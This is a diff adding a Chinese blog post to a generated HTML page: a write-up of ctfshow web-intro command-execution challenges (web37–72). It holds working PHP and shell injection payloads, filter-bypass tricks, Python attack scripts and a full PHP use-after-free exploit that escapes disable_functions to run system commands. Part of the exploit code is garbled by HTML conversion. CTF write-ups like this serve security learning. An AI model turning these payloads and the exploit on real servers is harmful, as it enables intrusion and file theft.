@@ -19,17 +19,35 @@
   <meta name="author" content="sakula33">
   <meta name="keywords" content="">
   
-    <meta name="description" content="sakula33的个人博客">
+    <meta name="description" content="今天我们做的是ctfshow中web入门的命令执行板块，也是学到了很多东西。当然也是被一些题给干不会了，早晚做完！！！ WP web37  首先查看源码  发现了include函数，但是把flag过滤了，那我们就没法直接用filter协议了 所以我们可以使用php:&#x2F;&#x2F;input或者是data协议 第一种使用php:&#x2F;&#x2F;input 构造payload: ?c">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctfshow-web入门-part2">
 <meta property="og:url" content="https://sakula33.github.io/2025/03/30/ctfshow-web%E5%85%A5%E9%97%A8-part2/index.html">
 <meta property="og:site_name" content="sakula33">
-<meta property="og:description" content="sakula33的个人博客">
+<meta property="og:description" content="今天我们做的是ctfshow中web入门的命令执行板块，也是学到了很多东西。当然也是被一些题给干不会了，早晚做完！！！ WP web37  首先查看源码  发现了include函数，但是把flag过滤了，那我们就没法直接用filter协议了 所以我们可以使用php:&#x2F;&#x2F;input或者是data协议 第一种使用php:&#x2F;&#x2F;input 构造payload: ?c">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/3701.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/3701.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/3701.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4001.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4002.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4003.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4101.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4102.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4103.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4201.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/5801.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/6601.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/6602.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/7101.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/7201.png">
+<meta property="og:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/7201.png">
 <meta property="article:published_time" content="2025-03-30T08:27:49.000Z">
-<meta property="article:modified_time" content="2025-03-30T08:27:49.908Z">
+<meta property="article:modified_time" content="2025-03-30T12:56:34.383Z">
 <meta property="article:author" content="sakula33">
+<meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://sakula33.github.io/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/3701.png">
   
   
   
@@ -242,7 +260,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          0 字
+          3.1k 字
         
       </span>
     
@@ -253,7 +271,7 @@
         
         
         
-          1 分钟
+          26 分钟
         
       </span>
     
@@ -295,7 +313,522 @@
             
               <div class="markdown-body">
                 
-                
+                <p>今天我们做的是ctfshow中web入门的命令执行板块，也是学到了很多东西。<br>当然也是被一些题给干不会了，早晚做完！！！</p>
+<h1 id="WP">WP</h1>
+<h2 id="web37">web37</h2>
+
+<p>首先查看源码</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/3701.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现了include函数，但是把flag过滤了，那我们就没法直接用filter协议了</p>
+<p>所以我们可以使用php:&#x2F;&#x2F;input或者是data协议</p>
+<p>第一种使用php:&#x2F;&#x2F;input</p>
+<p>构造payload:</p>
+<p>?c&#x3D;php:&#x2F;&#x2F;input <?php system('tac f*');?></p>
+<p>我们使用Bp进行post传参</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/3701.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/3701.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样我们就得到了flag</p>
+<p>第二种方法：使用data协议</p>
+<p>构造payload:</p>
+<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac f*');?></p>
+<p>或者进行加密之后传入</p>
+<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZionKTs&#x2F;Pg&#x3D;&#x3D;</p>
+<h2 id="web38">web38</h2>
+
+<p>首先我们查看源码，发现和上一题比较过滤了php，那么我们使用data协议即可(加密后的)</p>
+<h2 id="web39">web39</h2>
+
+<p>首先我们查看源码，发现是在我们传入的命令后面给拼接上php</p>
+<p>那么我们还是传入</p>
+<p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac f*');?></p>
+<p>即可得到flag</p>
+<h2 id="web40">web40</h2>
+
+<p>首先查看源码</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4001.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现这次过滤了很多东西，我们前面使用的那些都没法使用了</p>
+<p>注意这里过滤的是中文的括号</p>
+<p>先说一个打印当初路径下文件的函数:print_r(scandir(‘.’))</p>
+<p>但是这里已经把单引号和小数点都过滤了</p>
+<p>那我们就只能再找别的东西了，最好是一个函数。</p>
+<p>localeconv()      返回一包含本地数字及货币格式信息的数组</p>
+<p>那么接下来要做的就是想办法构造print_r(scandir(localeconv()[0]))</p>
+<p>但是这个函数不能这样用，而且题目也把方括号给过滤了，所以我们要找能有类似功能的</p>
+<p>有这样的三个函数</p>
+<b>
+current() 函数返回数组中的当前元素（单元）,默认取第一个值，
+pos() 同 current() ,是current()的别名
+reset() 函数返回数组第一个单元的值，如果数组为空则返回 FALSE
+</b>
+
+<p>那么我们就能打印当前的目录了</p>
+<p>我们构造payload:</p>
+<p>print_r(scandir(current(localeconv())));</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4002.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样我们就得到了当前的目录</p>
+<p>我们就可以继续往下推进了</p>
+<p>我们这里可以用的是</p>
+<p>highlight_file函数和next()</p>
+<p>next()：</p>
+<p>输出数组中的当前元素的下一个元素的值，也就是输入第二个</p>
+<p>（end可以输出最后一个）</p>
+<p>但是这个题目中flag在第三个我们该怎么办呢</p>
+<p>我们可以用array_reverse函数（这个函数就是将数组转置）</p>
+<p>那么我们最终构造的payload:</p>
+<p>&#x2F;?c&#x3D;highlight_file(next(array_reverse(scandir(current(localeconv())))));</p>
+<p>这样我们就得到了flag</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4003.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="web41">web41</h2>
+
+<p>我们首先来看源码</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4101.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现貌似把所有的东西都给过滤了</p>
+<p>这种全过滤，反倒只有一种解法就是构造字符串</p>
+<p>&amp; 按位与 |按位或 ^ 按位异或 ~取反 为四大位运算符，其中按位异 | 没有过滤，过滤的字符是防异或、自增和取反构造字符</p>
+<p>从网上抄的的大佬的脚本</p>
+<pre>
+import re
+import requests
+
+url="http://67e43a48-b511-4fcd-b715-74df05737fd1.challenge.ctf.show:8080"
+
+a=[]
+ans1=""
+ans2=""
+for i in range(0,256):
+    c=chr(i)
+    tmp = re.match(r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-',c, re.I)
+    if(tmp):
+        continue
+        #print(tmp.group(0))
+    else:
+        a.append(i)
+
+# eval("echo($c);");
+mya="system"  #函数名 这里修改！
+myb="ls"      #参数
+def myfun(k,my):
+    global ans1
+    global ans2
+    for i in range (0,len(a)):
+        for j in range(i,len(a)):
+            if(a[i]|a[j]==ord(my[k])):
+                ans1+=chr(a[i])
+                ans2+=chr(a[j])
+                return;
+for k in range(0,len(mya)):
+    myfun(k,mya)
+data1="(\""+ans1+"\"|\""+ans2+"\")"
+ans1=""
+ans2=""
+for k in range(0,len(myb)):
+    myfun(k,myb)
+data2="(\""+ans1+"\"|\""+ans2+"\")"
+
+data={"c":data1+data2}
+r=requests.post(url=url,data=data)
+print(r.text)
+</pre>
+
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4102.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4103.png" srcset="/img/loading.gif" lazyload></p>
+<p>这样我们就得到了flag</p>
+<h2 id="web42">web42</h2>
+
+<p>首先我们查看源码</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/4201.png" srcset="/img/loading.gif" lazyload></p>
+<p>主要是这条代码：</p>
+<p><b>  system($c.” &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1”);</b></p>
+<p><b>&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1主要意思是不进行回显的意思</b></p>
+<p>可以参考<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tinywan/p/6025468.html">Shell脚本———— &#x2F;dev&#x2F;null 2&gt;&amp;1详解</a></p>
+<b>
+我们要让命令回显，那么进行命令分割即可
+
+<p>; &#x2F;&#x2F;分号<br>| &#x2F;&#x2F;只执行后面那条命令<br>|| &#x2F;&#x2F;只执行前面那条命令<br>&amp; &#x2F;&#x2F;两条命令都会执行<br>&amp;&amp; &#x2F;&#x2F;两条命令都会执行<br></p></b><p></p>
+<p>那么我们就可以构造payload:</p>
+<p>?c&#x3D;tac flag.php;<br>?c&#x3D;tac flag.php||</p>
+<h2 id="web43">web43</h2>
+
+<p>首先我们查看源码</p>
+<p>跟上一题相比，过滤了分号和cat那么我们就是用||和tac即可</p>
+<p>?c&#x3D;more flag.php||<br>?c&#x3D;sort flag.php||<br>?c&#x3D;less flag.php||<br>?c&#x3D;tac flag.php||<br>?c&#x3D;tail flag.php||<br>?c&#x3D;nl flag.php||<br>?c&#x3D;strings flag.php||</p>
+<p>都可以进行绕过</p>
+<h2 id="web44">web44</h2>
+
+<p>首先我们查看源码</p>
+<p>过滤了flag，那么我们使用 tac f*||即可</p>
+<b>
+通配符绕过
+
+<p>?c&#x3D;more ????.???||<br>?c&#x3D;more fla*.php||<br>?c&#x3D;more fl\ag.php||<br>?c&#x3D;more fl’’ag.php||<br></p></b><p></p>
+<h2 id="web45">web45</h2>
+
+<p>这一题就是多过滤了一个空格</p>
+<b>
+空格绕过
+
+<blockquote>
+<p><code> </code>&lt;<code> </code>&lt;&gt;<code>重定向符</code>%09<code>(需要php环境) </code>${IFS}<code> </code>$IFS$9<code> </code>{cat,flag.php}<code>//用逗号实现了空格功能</code>%20<code> </code>%09<br></p></blockquote></b><p></p>
+
+<h2 id="web46">web46</h2>
+
+<p>增加了$和*</p>
+<p>我们使用%09不算数字</p>
+<h2 id="web47">web47</h2>
+
+<p>我们接着看，新增了more less head sort tail</p>
+<p>对我们没什么影响</p>
+<p>?c&#x3D;tac%09fl””ag.php||</p>
+<h2 id="web48">web48</h2>
+
+<p>新增了sed cut awk strings od curl 反引号</p>
+<p>对我们还是没影响</p>
+<p>我们继续用上一题的payload</p>
+<h2 id="web49">web49</h2>
+
+<p>还是没什么影响 %09不算%</p>
+<h2 id="web50">web50</h2>
+
+<p>这道题真的是把%09给过滤了</p>
+<p>那么我们使用&lt;&gt;这个来过滤</p>
+<p>构造payload:</p>
+<p>?c&#x3D;tac&lt;&gt;fl””ag.php||</p>
+<h2 id="web51">web51</h2>
+
+<p>这一道题把tac给过滤了（天塌了）</p>
+<p>还剩个nl没过滤只能用这个了</p>
+<p>?c&#x3D;nl&lt;&gt;fl””g.php||</p>
+<p>出来个1，我们摁一下F12就能看到了</p>
+<h2 id="web52">web52</h2>
+
+<p>这次新增了&lt;&gt;这两个符号（真令人头大）</p>
+<p>但是$这个符号可以用了那么我们就使用${IFS}来绕过空格过滤</p>
+<p>?c&#x3D;nl${IFS}fl\ag.php||</p>
+<p>直接输入没得到flag，那么我们用ls来扫一目录吧</p>
+<p>?c&#x3D;ls${IFS}&#x2F;||</p>
+<p>得到根目录，看到了flag</p>
+<p>那么就应该是这个了</p>
+<p>?c&#x3D;nl${IFS}&#x2F;fl\ag||</p>
+<h2 id="web53">web53</h2>
+
+<p>这道题之前伴随我们的&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1没有了</p>
+<p>$IFS符号如果是在当前目录读文件则中间要用’’来分隔一下<br>如果读其他路径下的如根目录 &#x2F; 下的文件 则不用使用符分割<br>$IFS后边可以使用符号 但是不能直接跟字符 会显示无效命令<br>可构造playload：</p>
+<p>&#x2F;?c&#x3D;nl${IFS}fl\ag.php</p>
+<h2 id="web54">web54</h2>
+
+<p>新增了nl也给过滤了，真天塌了</p>
+<p>我只能从网上查查看看还有什么能用</p>
+<p>grep test *file #在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行</p>
+<p>构造payload:</p>
+<p>?c&#x3D;uniq${IFS}????.???<br>?c&#x3D;grep${IFS}’{‘${IFS}fl???php<br>（在 fl???php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行）</p>
+<h2 id="web55">web55</h2>
+
+<p>这次更是重量级把英文字母都给过滤了</p>
+<p>那么我们就只能找到有数字的命令，再搭配通配符匹配命令进行绕过了</p>
+<p>想想&#x2F;bin目录下的命令</p>
+<p>cat、cp、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等<br>发现存在一个base64</p>
+<p>那么我们就构造payload:</p>
+<p>?c&#x3D;&#x2F;???&#x2F;????64 ????.???<br>&#x2F;&#x2F;意思是&#x2F;bin&#x2F;base64 flag.php</p>
+<p>再看大佬们的方法</p>
+<p>1.bzip2方法</p>
+<p>bzip2是linux下面的压缩文件的命令<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-bzip2.html">关于bzip2命令的具体介绍</a><br>&#x2F;usr&#x2F;bin目录:</p>
+<p>主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等。</p>
+<p>我们可以利用&#x2F;usr&#x2F;bin下的bzip2</p>
+<p>意思就是说我们先将flag.php文件进行压缩，然后再将其下载</p>
+<p>payload：</p>
+<p>?c&#x3D;&#x2F;???&#x2F;???&#x2F;????2 ????.???<br>也就是&#x2F;usr&#x2F;bin&#x2F;bzip2 flag.php</p>
+<p>然后访问&#x2F;flag.php.bz2进行下载获得flag.php</p>
+<ol start="2">
+<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a><br>.(点)的用法，就是相当于source 可以执行sh命令<a target="_blank" rel="noopener" href="https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html">linux下的.使用</a></li>
+</ol>
+<p>在这个之前我们需要构造一个post上传文件的数据包。</p>
+<p>&lt; !DOCTYPE html&gt;<br>&lt; html lang&#x3D;”en”&gt;<br>&lt; head&gt;<br>    &lt; meta charset&#x3D;”UTF-8”&gt;<br>    &lt; meta name&#x3D;”viewport” content&#x3D;”width&#x3D;device-width, initial-scale&#x3D;1.0”&gt;<br>    &lt; title&gt;POST数据包POC<br>&lt; &#x2F;head&gt;<br>&lt; body&gt;<br>&lt; form action&#x3D;”<a target="_blank" rel="noopener" href="http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/">http://46230c96-8291-44b8-a58c-c133ec248231.chall.ctf.show/</a>“ method&#x3D;”post” enctype&#x3D;”multipart&#x2F;form-data”&gt;<br>&lt; !–链接是当前打开的题目链接–&gt;<br>    &lt; label for&#x3D;”file”&gt;文件名：<br>    &lt; input type&#x3D;”file” name&#x3D;”file” id&#x3D;”file”&gt;<br><br>    &lt; input type&#x3D;”submit” name&#x3D;”submit” value&#x3D;”提交”&gt;<br>&lt; &#x2F;form&gt;<br>&lt; &#x2F;body&gt;<br>&lt; &#x2F;html&gt;</p>
+<p>然后抓包<br>构造poc执行命令</p>
+<p>?c&#x3D;.+&#x2F;???&#x2F;????????[@-[]<br>注：后面的[@-[]是linux下面的匹配符，是进行匹配的大写字母。<br>然后在上传文件内容添加sh命令</p>
+<p>#!&#x2F;bin&#x2F;sh<br>ls</p>
+<p>或者直接运行下面的脚本即可得到flag：</p>
+<pre>
+import requests
+
+while True:
+    url = "http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]"
+    r = requests.post(url, files={"file": ('feng.txt', b'cat flag.php')})
+    if r.text.find("flag") > 0:
+        print(r.text)
+        break
+</pre>
+
+<h2 id="web56">web56</h2>
+
+<p>这次把数字也给过滤了</p>
+<p>用上边的无数字字母getshell方法</p>
+<h2 id="web58-65">web58-65</h2>
+
+<p>查看源码</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/5801.png" srcset="/img/loading.gif" lazyload></p>
+<p>主要是过滤各种函数</p>
+<p>构造payload:（要用post传参）</p>
+<p>c&#x3D;show_source(‘flag.php’);<br>c&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p>
+<h2 id="web66">web66</h2>
+
+<p>show_source函数被禁用了</p>
+<p>用print_r(scandir(‘&#x2F;‘));查看根目录之后，看到了flag.txt</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/6601.png" srcset="/img/loading.gif" lazyload></p>
+<p>再用c&#x3D;highlight_file(‘&#x2F;flag.txt’);得到了flag</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/6602.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="web67">web67</h2>
+
+<p>print_r函数也被禁用了 我们可以使用var_dump()函数代替</p>
+<h2 id="web68">web68</h2>
+
+<p>highlight_file函数被禁用了，看不到源码了</p>
+<p>但是这道题没有禁用include()函数，可以利用文件包含漏洞读取flag.txt</p>
+<p>c&#x3D;var_dump(scandir(‘&#x2F;‘));<br>c&#x3D;include(‘&#x2F;flag.txt’);</p>
+<h2 id="web69-70">web69-70</h2>
+
+<p>把var_dump函数给ban了，那么我们就用var_export()函数</p>
+<p>c&#x3D;var_export(scandir(‘&#x2F;‘));<br>c&#x3D;include(‘&#x2F;flag.txt’);</p>
+<h2 id="web71">web71</h2>
+
+<p>附件给了我们源码</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/7101.png" srcset="/img/loading.gif" lazyload></p>
+<p>$s &#x3D; ob_get_contents();&#x2F;&#x2F;得到缓冲区的数据。</p>
+<p>ob_end_clean();&#x2F;&#x2F;会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</p>
+<p>并且用?代替数字和字母</p>
+<p>那么我们可以用exit()或者die()提前结束，这样就不会替换了</p>
+<p>构造payload:</p>
+<p>c&#x3D;var_export(scandir(‘&#x2F;‘));exit();<br>c&#x3D;include(“&#x2F;flag.txt”);die();</p>
+<h2 id="web72">web72</h2>
+
+<p>这道题存在open_basedir(open_basedir 是 PHP 中的一个重要安全配置指令，用于 限制 PHP 脚本可以访问的文件系统路径，防止恶意脚本越权访问服务器上的敏感文件（如 &#x2F;etc&#x2F;passwd、其他用户的网站数据等）。)</p>
+<p>利用glob伪协议在筛选目录时不受open_basedir制约（glob:&#x2F;&#x2F; 是 PHP 提供的一个 伪协议（Wrapper），用于 匹配文件路径模式（类似 Shell 中的通配符 *），常用于 目录遍历 和 文件查找。它在 CTF 和安全测试中经常被用来绕过 open_basedir 限制。）</p>
+<p>语法：glob:&#x2F;&#x2F;&lt;模式&gt;</p>
+<p>构造：<br>c&#x3D;<br>$a&#x3D;new DirectoryIterator(“glob:&#x2F;&#x2F;&#x2F;*”);<br>foreach($a as $f){<br>echo $f.”    “ ;<br>}</p>
+<p>exit();</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/7201.png" srcset="/img/loading.gif" lazyload></p>
+<p>知道了文件时&#x2F;flag0.txt,就要想办法绕过open_basedir和disable_functions来读了</p>
+<p>大佬的exp：</p>
+<pre>
+c=?><?php
+pwn("ls /;cat /flag0.txt");
+ 
+function pwn($cmd) {
+    global $abc, $helper, $backtrace;
+    class Vuln {
+        public $a;
+        public function __destruct() { 
+            global $backtrace; 
+            unset($this->a);
+            $backtrace = (new Exception)->getTrace(); # ;)
+            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4
+                $backtrace = debug_backtrace();
+            }
+        }
+    }
+ 
+    class Helper {
+        public $a, $b, $c, $d;
+    }
+ 
+    function str2ptr(&$str, $p = 0, $s = 8) {
+        $address = 0;
+        for($j = $s-1; $j >= 0; $j--) {
+            $address <<= 8; $address |="ord($str[$p+$j]);" } return $address; function ptr2str($ptr, $m="8)" { $out ; for ($i="0;" $i < $m; $i++) .="sprintf('%c',$ptr" & 0xff); $ptr>>= 8;
+        }
+        return $out;
+    }
+ 
+    function write(&$str, $p, $v, $n = 8) {
+        $i = 0;
+        for($i = 0; $i < $n; $i++) {
+            $str[$p + $i] = sprintf('%c',$v & 0xff);
+            $v >>= 8;
+        }
+    }
+ 
+    function leak($addr, $p = 0, $s = 8) {
+        global $abc, $helper;
+        write($abc, 0x68, $addr + $p - 0x10);
+        $leak = strlen($helper->a);
+        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
+        return $leak;
+    }
+ 
+    function parse_elf($base) {
+        $e_type = leak($base, 0x10, 2);
+ 
+        $e_phoff = leak($base, 0x20);
+        $e_phentsize = leak($base, 0x36, 2);
+        $e_phnum = leak($base, 0x38, 2);
+ 
+        for($i = 0; $i < $e_phnum; $i++) {
+            $header = $base + $e_phoff + $i * $e_phentsize;
+            $p_type  = leak($header, 0, 4);
+            $p_flags = leak($header, 4, 4);
+            $p_vaddr = leak($header, 0x10);
+            $p_memsz = leak($header, 0x28);
+ 
+            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
+                # handle pie
+                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
+                $data_size = $p_memsz;
+            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
+                $text_size = $p_memsz;
+            }
+        }
+ 
+        if(!$data_addr || !$text_size || !$data_size)
+            return false;
+ 
+        return [$data_addr, $text_size, $data_size];
+    }
+ 
+    function get_basic_funcs($base, $elf) {
+        list($data_addr, $text_size, $data_size) = $elf;
+        for($i = 0; $i < $data_size / 8; $i++) {
+            $leak = leak($data_addr, $i * 8);
+            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
+                $deref = leak($leak);
+                # 'constant' constant check
+                if($deref != 0x746e6174736e6f63)
+                    continue;
+            } else continue;
+ 
+            $leak = leak($data_addr, ($i + 4) * 8);
+            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
+                $deref = leak($leak);
+                # 'bin2hex' constant check
+                if($deref != 0x786568326e6962)
+                    continue;
+            } else continue;
+ 
+            return $data_addr + $i * 8;
+        }
+    }
+ 
+    function get_binary_base($binary_leak) {
+        $base = 0;
+        $start = $binary_leak & 0xfffffffffffff000;
+        for($i = 0; $i < 0x1000; $i++) {
+            $addr = $start - 0x1000 * $i;
+            $leak = leak($addr, 0, 7);
+            if($leak == 0x10102464c457f) { # ELF header
+                return $addr;
+            }
+        }
+    }
+ 
+    function get_system($basic_funcs) {
+        $addr = $basic_funcs;
+        do {
+            $f_entry = leak($addr);
+            $f_name = leak($f_entry, 0, 6);
+ 
+            if($f_name == 0x6d6574737973) { # system
+                return leak($addr + 8);
+            }
+            $addr += 0x20;
+        } while($f_entry != 0);
+        return false;
+    }
+ 
+    function trigger_uaf($arg) {
+        # str_shuffle prevents opcache string interning
+        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
+        $vuln = new Vuln();
+        $vuln->a = $arg;
+    }
+ 
+    if(stristr(PHP_OS, 'WIN')) {
+        die('This PoC is for *nix systems only.');
+    }
+ 
+    $n_alloc = 10; # increase this value if UAF fails
+    $contiguous = [];
+    for($i = 0; $i < $n_alloc; $i++)
+        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
+ 
+    trigger_uaf('x');
+    $abc = $backtrace[1]['args'][0];
+ 
+    $helper = new Helper;
+    $helper->b = function ($x) { };
+ 
+    if(strlen($abc) == 79 || strlen($abc) == 0) {
+        die("UAF failed");
+    }
+ 
+    # leaks
+    $closure_handlers = str2ptr($abc, 0);
+    $php_heap = str2ptr($abc, 0x58);
+    $abc_addr = $php_heap - 0xc8;
+ 
+    # fake value
+    write($abc, 0x60, 2);
+    write($abc, 0x70, 6);
+ 
+    # fake reference
+    write($abc, 0x10, $abc_addr + 0x60);
+    write($abc, 0x18, 0xa);
+ 
+    $closure_obj = str2ptr($abc, 0x20);
+ 
+    $binary_leak = leak($closure_handlers, 8);
+    if(!($base = get_binary_base($binary_leak))) {
+        die("Couldn't determine binary base address");
+    }
+ 
+    if(!($elf = parse_elf($base))) {
+        die("Couldn't parse ELF header");
+    }
+ 
+    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
+        die("Couldn't get basic_functions address");
+    }
+ 
+    if(!($zif_system = get_system($basic_funcs))) {
+        die("Couldn't get zif_system address");
+    }
+ 
+    # fake closure object
+    $fake_obj_offset = 0xd0;
+    for($i = 0; $i < 0x110; $i += 8) {
+        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+    }
+ 
+    # pwn
+    write($abc, 0x20, $abc_addr + $fake_obj_offset);
+    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
+    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
+ 
+    ($helper->b)($cmd);
+    exit();
+}
+</=></pre>
+
+<p>记得url编码之后再上传</p>
+<p><img src="/images/ctfshow-web%E5%85%A5%E9%97%A8-part2/7201.png" srcset="/img/loading.gif" lazyload></p>
+<h1 id="总结">总结</h1>
+
+<p>这个暂时还未完结啊，剩下的几道题目，我不会(理直气壮)，大佬们的wp也还没看懂，过几天我慢慢学习一下，再把他完结掉！！！我肯定会来把这个模块给完结掉的，绝对不会鸽！！！</p>
+<p>在这里先做一个小总结</p>
+<p>几种常见的过滤的姿势</p>
+<h2 id="cat的过滤姿势">cat的过滤姿势</h2>
+
+<p>more<br>sort<br>less<br>tac<br>tail<br>nl<br>strings</p>
+<h2 id="空格的绕过姿势">空格的绕过姿势</h2>
+
+<p><code>&gt;</code> <code>&lt;</code> <code>&lt;&gt;</code> 重定向符<br><code>%09</code>(需要php环境)<br><code>$&#123;IFS&#125;</code><br><code>$IFS$9</code><br><code>&#123;cat,flag.php&#125;</code> &#x2F;&#x2F;用逗号实现了空格功能<br><code>%20</code><br><code>%09</code></p>
+<h2 id="flag的绕过姿势">flag的绕过姿势</h2>
+
+<p>通配符绕过</p>
+<p>?c&#x3D;more ????.???<br>?c&#x3D;more fla*.php<br>?c&#x3D;more fl\ag.php<br>?c&#x3D;more fl’’ag.php</p>
+<h2 id="突破函数禁用">突破函数禁用</h2>
+
+<p>这里我知道的也不多，就总结一下这个模块出现的一些把</p>
+<p>一.<br>show_source()<br>print_r()<br>var_dump()<br>var_export()</p>
+<p>二.<br>highlight_file()<br>include()</p>
+
                 
               </div>
             
@@ -303,6 +836,34 @@
             <div>
               <div class="post-metas my-3">
   
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%8E%9F%E5%88%9B/" class="category-chain-item">原创</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+    </div>
   
 </div>
 
